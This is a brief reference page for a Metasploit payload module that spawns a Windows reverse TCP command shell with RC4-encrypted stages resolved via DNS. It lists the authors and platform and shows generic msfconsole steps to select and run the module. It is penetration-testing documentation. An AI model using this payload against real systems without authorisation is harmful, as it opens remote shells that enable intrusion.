## Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption DNS)

Spawn a piped command shell (staged). Connect back to the 
attacker


## Module Name
payload/windows/shell/reverse_tcp_rc4_dns

## Authors
* spoonm
* sf
* hdm
* skape
* mihi
* RageLtMan





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/shell/reverse_tcp_rc4_dns
msf payload(reverse_tcp_rc4_dns) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_rc4_dns) > set TARGET <target-id>
msf payload(reverse_tcp_rc4_dns) > show options
   ... show and set options ...
msf payload(reverse_tcp_rc4_dns) > run
```
    
    